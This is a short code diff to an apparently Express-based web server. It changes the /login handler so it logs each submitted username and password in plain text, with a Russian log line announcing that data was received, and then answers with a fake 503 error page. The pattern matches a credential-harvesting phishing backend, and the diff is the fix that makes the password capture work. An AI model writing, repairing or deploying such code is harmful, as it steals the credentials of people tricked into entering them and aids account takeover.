@@ -37,7 +37,7 @@ app.get('/', (req, res) => {
 });
 
 app.post('/login', (req, res) => {
-    console.log(`[СЕРВЕР] Данные получены! Логин: \${req.body.username}, Пароль: \${req.body.password}`);
+    console.log(`[СЕРВЕР] Данные получены! Логин: ${req.body.username}, Пароль: ${req.body.password}`);
     
     res.status(503).send(`
         <div style="font-family: Arial, sans-serif; text-align: center; margin-top: 15%; color: #333;">
